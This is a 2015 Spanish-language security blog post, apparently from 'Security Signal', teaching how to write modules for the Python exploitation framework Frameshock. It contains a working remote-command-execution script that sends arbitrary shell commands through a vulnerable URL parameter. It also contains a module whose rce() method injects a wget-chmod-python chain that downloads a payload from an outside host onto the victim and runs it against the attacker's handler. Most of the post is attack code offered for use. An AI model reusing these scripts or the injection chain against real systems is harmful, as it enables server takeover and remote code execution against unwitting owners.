@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Programa Tu Modulo Para Frameshock - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="&nbsp;by [Q]3rV[0]Recientemente y de la mano de mi amigo hdbreaker salio a la luz un nuevo framework de explotacion llamado Frameshock, el cual &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/02/07/programa-tu-modulo-para-frameshock/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Programa Tu Modulo Para Frameshock</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-02-07T12:44:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:44 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/8KCwaUh.jpg?3" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/8KCwaUh.jpg?3" height="250" width="400" /></a></div><div style="text-align: center;"><br /></div><br /><b>&nbsp;by [Q]3rV[0]</b></div><div style="text-align: right;"><br /></div>Recientemente y de la mano de mi amigo<b> hdbreaker</b> salio a la luz un nuevo framework de explotacion llamado <b>Frameshock</b>, el cual promete ser una<br /><a name='more'></a>herramienta que a futuro, llegue a competir con el imponente <b>Metasploit</b>. Lo mejor de esta tool es que esta basada completamente en python y el desarrollo de exploits, auxiliares, etc se hace tremendamente sencillo debido a la manera en que trata los modulos.<br /><br />En fin, basta de chicharas y vamos a evocarnos a lo que el titulo llama. Antes de proseguir con el resto del tutorial, se tiene en cuenta que el lector cuenta con conocimientos de POO en el lenguaje python.<br /><br /><b>*** ADVERTENCIA ***</b> Si estas leyendo esto y todavía no te encontras  familiarizado con el framework, podes ver el siguiente <a href="http://www.securitysignal.tk/2015/02/frameshock-al-descubierto.html">enlace</a><br /><br /><h2 style="text-align: center;">Estructura de los módulos </h2><h3 style="text-align: left;"></h3><span style="font-weight: normal;">La estructura de los módulos es la siguiente, y lo único a respetar durante el desarrollo.</span><br /><br /><pre class="brush: py"># -*- coding : utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br /><br />class module(config):<br /><br />    def __init__(self):<br />        self.config=config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br /><br />    def preExecution(self):<br />        while 1:<br />            ################Aca se definen las opciones y se cargan los argumentos################<br /><br /><br /><br />    def exploit(self):<br />        if len(self.targets)&gt;0:<br />            for target in self.targets:<br />                print "Attack "+target[1]<br />                ################Aca va el exploit################<br />        else:<br />            print "No hay targets"<br /><br />################Aca va el metodo que contiene el exploit################<br />    def test(self):<br />        print "Attack Test"<br />########################################################################<br /><br />##########Se inicia el modulo###########<br />start=module()<br />########################################<br /></pre><br />Como se ve:<br /><br /><ul><li>Se importan módulos necesarios como <b>sys</b> para agregar el dir base al PATH de python: <b>sys.path.append('.')</b></li></ul><ul><li>Se importa el modulo <b>config</b> el cual contiene ciertos métodos que nos proveerán de los datos que configuramos con la opción <b>config en el prompt de frameshock</b>. Además es necesario para trabajar con <b>shodan y la db</b> si es que lo necesitamos.</li></ul><ul><li>Se importa <b>tabulate</b>, el cual lo usaremos para mostrar informacion en forma de tabla como por ejemplo los targets seteados.</li></ul><br /><h2 style="text-align: center;">La clase module()</h2><h3 style="text-align: center;">&nbsp;</h3><div style="text-align: left;">La clase module contiene tres métodos,<b> </b>en<b> __init__</b>:</div><ul><li>Se inicializa el objeto <b>config</b> y se llama a dos métodos dentro de <b>config</b></li></ul><ul><li><b>getCursor()</b></li><li><b>getCon()</b></li></ul><div style="text-align: left;"><br />Necesarios para trabajar con la db <b>sqlite3</b>, como dije anteriormente nos servirán para hacer uso de <b>shodan</b>, pero en este apartado no se hará referencia al mismo, aunque de igual manera se mencionaran.</div><ul><li>Se crea una lista vacía <b>self.targets=[]</b> que almacenara los objetivos que seleccionemos en modo manual.</li></ul><ul><li>Por ultimo se llama al método <b>preExecution.</b></li></ul><br /><div style="text-align: center;"><h2><b>preExecution()</b></h2></div><ul></ul><br />Acá indicaremos la opciones que contendrá el modulo y cargaremos los argumentos que son pasados a través de esas opciones, tales como el target objetivo, la opción de arranque del modulo, etc. Eso va en los parámetros que necesite recibir nuestro modulo, si desean también pueden incluir una opción para desplegar información acerca del mismo, o datos del autor.<br />&nbsp;Comencemos! y a partir de acá, siéntanse libres de codear a su antojo, para nuestro ejemplo voy a portar como modulo de Frameshock un simple script que explota un rce.<br /><br /><div style="text-align: left;"></div><pre class="brush: py">#!/usr/bin/python<br /><br />import urllib2<br />import sys<br /><br />def rce(target):<br />    while 1:<br />        command=raw_input("$&gt; ")<br />        w=urllib2.urlopen(target+"www.google.com|"+command)<br />        print w.read()<br /><br />rce(sys.argv[1])<br /></pre><br /><div style="text-align: center;"><h3><b>let's go!</b></h3></div><br />Arranquemos por definir la opción <b>help</b>. Por comodidad respecto a la sintaxis se optara por utilizar la misma que msf, pero no es algo indispensable.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-Fy3uRAxgfLM/VNZuP8UKYxI/AAAAAAAAAXM/SfkPBSL21tA/s1600/pre1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-Fy3uRAxgfLM/VNZuP8UKYxI/AAAAAAAAAXM/SfkPBSL21tA/s1600/pre1.png" height="174" width="640" /></a></div><br /><br />Ahora continuemos con el resto de las opciones necesarias para nuestro modulo.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-BUIJ0Wy-xrA/VNZuu5tMZVI/AAAAAAAAAXU/zy1ca5_c_TU/s1600/preexecu2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-BUIJ0Wy-xrA/VNZuu5tMZVI/AAAAAAAAAXU/zy1ca5_c_TU/s1600/preexecu2.png" height="412" width="640" /></a></div><br /><br />Sencillo no?, no hace falta explicar mucho, el código habla por si solo.<br /><br />Para obtener el objetivo, hacemos un split a la cadena <b>set target</b>, tomamos el indice 2 y luego hacemos un append para ingresar los datos dentro de <b>self.targets</b>.<br />&nbsp; <br />Para desplegar los objetivos lo hacemos con tabulate, por cuestiones de estetica, lo dije antes y lo vuelvo a decir, <b>SIÉNTANSE LIBRES!</b><br /><br />Si la opción elegida es <b>exploit</b> invoca el metodo <b>exploit()</b> que lo trataremos en el siguiente paso.<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /><h2 style="text-align: center;">exploit()</h2><h2 style="text-align: center;"></h2><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-3WSHvxRJY1I/VNVTUFvGHPI/AAAAAAAAAWU/cg3LMPn1JwY/s1600/no_me_digas_by_rober_raik-d4dt7n7.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-3WSHvxRJY1I/VNVTUFvGHPI/AAAAAAAAAWU/cg3LMPn1JwY/s1600/no_me_digas_by_rober_raik-d4dt7n7.png" height="532" width="640" /></a></div><br /><div style="text-align: left;">Tenemos dos caminos, utilizar algún <b>payload provisto por Frameshock</b>, o bien realizar una conexión directa.<br /><br />Como el <b>handler</b> del framework no esta el divino botón optaremos por la primera.<br /><br />Definiremos el método que contendrá el exploit e importaremos las librerias necesarias. </div><div style="text-align: left;"><br /></div><pre class="brush: py">def rce(self, target):<br />        command="wget%20http://"+self.config.getUrlInjector()+"%20-O%20"+self.config.getInjectorName()+"%3Bchmod%20755%20"+self.config.getInjectorName()+"%3Bpython%20"+self.config.getInjectorName()<br />        urllib2.urlopen(target+"www.google.com%7C"+command) </pre><br />Hagamos un párate y pongamos un par de cosas en remojo.<br /><br /><ul><li><b>self.config.getUrlInjector()</b> : Retorna la url del payload que hemos seteado desde frameshock</li></ul><ul><li><b>self.config.getInjectorName()</b> : Nos devolverá el nombre del payload elegido.</li></ul><br />Entonces el metodo rce() lo único que hace es descargar nuestro payload en el servidor remoto, darle permisos de ejecución y <b>lanzarlo contra nuestro handler</b>.<br /><br /><br /><pre class="brush: py">command="wget http://"+self.config.getUrlInjector()+" -O "+self.config.getInjectorName()+";chmod 755 "+self.config.getInjectorName()+";python "+self.config.getInjectorName()<br /></pre><br />Lo llamamos desde <b>exploit()</b> y nos disponemos a probar nuestro modulo, quedando de la siguiente manera.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-JZs3v7Bivto/VNaxNBtZXzI/AAAAAAAAAYA/E-3bTc_yDgM/s1600/exploitcall.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-JZs3v7Bivto/VNaxNBtZXzI/AAAAAAAAAYA/E-3bTc_yDgM/s1600/exploitcall.png" height="152" width="640" /></a></div><br /><br /><br /><pre class="brush: py"># -*- coding : utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br />import urllib2<br /><br />class module(config):<br /><br />    def __init__(self):<br />        self.config=config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br /><br />    def preExecution(self):<br />        while 1:<br />            ################Aca se definen las opciones y se cargan los argumentos################<br />            opcion=raw_input("&gt; ")<br /><br />            if opcion=="help":<br />                print("set target &lt;TARGET&gt; -&gt; Setea el target manualmente")<br />                print("exit -&gt; Cierra el modulo")<br />                print("show targets -&gt; Muestra los targets seteados")<br />                print("clear targets -&gt; Elimina los targets")<br />                print("exploit -&gt; Inicia el modulo de ataque")<br /><br />            elif opcion.find("set target")!=-1:<br />                target=opcion.split(' ')[2]<br />                self.targets.append((0, target, "Modulo para explotar un RCE", "RCE"))<br /><br />            elif opcion=="exit":<br />                exit(0)<br /><br />            elif opcion=="show targets":<br />                if len(self.targets)&gt;0:<br />                    print tabulate(self.targets, ["ID", "TARGET", "DESCRIPCION", "MODULO"], tablefmt="grid")<br />                else:<br />                    print "No hay targets seteados"<br /><br />            elif opcion=="clear targets":<br />                self.targets=[]<br /><br />            elif opcion=="exploit":<br />                self.exploit()<br /><br /><br />    def exploit(self):<br />        if len(self.targets)&gt;0:<br />            for target in self.targets:<br />                print "Attack "+target[1]<br />                ################Aca va el exploit################<br />                self.rce(target[1])<br />        else:<br />            print "No hay targets"<br /><br />################Aca va el metodo que contiene el exploit################<br />    def rce(self, target):<br />        command="wget%20http://"+self.config.getUrlInjector()+"%20-O%20"+self.config.getInjectorName()+"%3Bchmod%20755%20"+self.config.getInjectorName()+"%3Bpython%20"+self.config.getInjectorName()<br />        urllib2.urlopen(target+"www.google.com%7C"+command)<br />########################################################################<br /><br />##########Se inicia el modulo###########<br />start=module()<br />########################################<br /><br /></pre>Antes que nada, lo guardaremos en el directorio <b>/FrameShock/Modules</b> respetando la regla del nombre.<br /><br /><b>numero_nombremodulo.py</b><br /><br />Por ejemplo:<b> </b><br /><br />Si tenemos los siguiente módulos (<b>1_moduloprueba.py, 2_moduloprueba.py, 3_moduloprueba.py</b>), Lo agregaremos como <b>4_rce.py</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-iKle3OWpmxg/VNVggASqhBI/AAAAAAAAAWs/-ibGmZZz7rE/s1600/15127416.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-iKle3OWpmxg/VNVggASqhBI/AAAAAAAAAWs/-ibGmZZz7rE/s1600/15127416.jpg" height="640" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div style="text-align: center;">Estamos listos para cargar nuestro modulo de prueba.</div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-HcbKH6dgzWA/VNZ1yQ5FxFI/AAAAAAAAAXk/Uw_DDHL1O9s/s1600/attack.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-HcbKH6dgzWA/VNZ1yQ5FxFI/AAAAAAAAAXk/Uw_DDHL1O9s/s1600/attack.png" height="422" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div style="text-align: center;"><b>BOOM! explotado con exito el rce!</b></div><br />Cabe resaltar para terminar, que en el directorio&nbsp;<b> /FrameShock/ExampleModule</b> contamos con un modulo de ejemplo para comenzar a programar desde ahí.<br /><br /><br /><pre class="brush: py"># -*- coding: utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br /><br />class module(config):<br /><br /><br />####Init configuration####<br />    def __init__(self):<br />        self.config = config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br />##########################<br /><br />####User define information####<br />    def preExecution(self):<br />        while(True):<br />            option = raw_input("&gt; ")<br />            if(option=="exit"):<br />                exit(0)<br /><br />            if(option=="help"):<br /><br />                print("set target URL:PORT --&gt; Manual Target")<br />                print("clear targets       --&gt; Show Targets in module")<br />                print("show targets        --&gt; Clear Targets in module")<br />                print("use shodan          --&gt; Targets from Shodan Results")<br />                print("exploit             --&gt; Start atack")<br />                print("exit                --&gt; Close Module")<br /><br />            if(option.find("set target")&gt;-1):<br />                data = option.split(" ")<br />                data = data[2].split(":");<br />                target = data[0]<br />                port = data[1]<br />                self.targets.append((0,target,port,"Manual","null"))<br /><br />            if(option.find("use shodan")&gt;-1):<br />                self.targets=self.config.getTargets();<br /><br />            if(option=="clear targets"):<br />                self.targets=[]<br />                print("Clear Done")<br /><br />            if(option=="show targets"):<br />                if(len(self.targets)!=0):<br />                        print tabulate(self.targets, ["id", "IP", "PORT", "Description", "Vulnerable Module"], tablefmt="grid")<br />                else:<br />                    print "No targets"<br /><br />            if(option=="exploit"):<br />                self.exploit()<br />###################################<br /><br />###Exploit c0de###<br />    def exploit(self):<br />        if(len(self.targets)!=0):<br />            for target in self.targets:<br />                ###YOUR EXPLOIT CODE HERE###<br />                print "Atack "+target[1]+":"+target[2]<br />        else:<br />            print "No targets found";<br /><br />####def custom user functions (calleable from exploit())####<br />    def testFunctions(self):<br />        print "Atack test"<br />#############################################################<br /><br />#####Init Module#####<br />start = module()<br />#####################<br /></pre><br />Saludos! y Happy Frameshock Hacking!</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-02-07T12:44:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:44 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/02/07/programa-tu-modulo-para-frameshock/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/02/07/programa-tu-modulo-para-frameshock/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/02/05/quien-te-choco-hackeado-patentes/" title="Previous Post: ¿Quién te choco? Hackeando Patentes ">&laquo; ¿Quién te choco? Hackeando Patentes </a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/02/18/level4-pwned/" title="Next Post: Level4 Pwned!">Level4 Pwned! &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
